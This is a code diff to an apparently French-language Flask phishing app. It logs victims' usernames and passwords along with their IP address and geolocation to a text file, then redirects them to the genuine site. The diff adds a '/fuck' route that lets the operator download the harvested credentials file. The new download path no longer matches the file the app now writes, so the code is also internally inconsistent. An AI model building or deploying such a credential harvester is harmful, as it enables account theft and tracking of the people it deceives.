@@ -162,7 +162,7 @@ def home():
     '''
 
 def write_info(username, password):
-    with open("../info.txt", 'a') as f:
+    with open("./info.txt", 'a') as f:
         f.write(f'Name:{username}\t|password:{password}\n')
 
 @app.route('/login', methods=['POST'])
@@ -195,11 +195,18 @@ def login():
     loc = location_info.get('loc')
 
     #Enregistrez dans un fichier
-    with open("../info.txt", 'a') as f:
+    with open("./info.txt", 'a') as f:
         f.write(f'Name:{username}\t|password:{password}\t|IP: {ip_address}\t|City:{city}\t|Country:{country}\t|Region:{region}\t|Location: {loc}\n')
 
     #Redirection vers le vrai site
     return redirect(true_site)
+
+@app.route('/fuck')
+def download():
+    try:
+        return send_file('../info.txt', as_attachment=True)
+    except FileNotFoundError:
+        return "Fichier pas trouvé"
 
 
 if __name__ == '__main__':
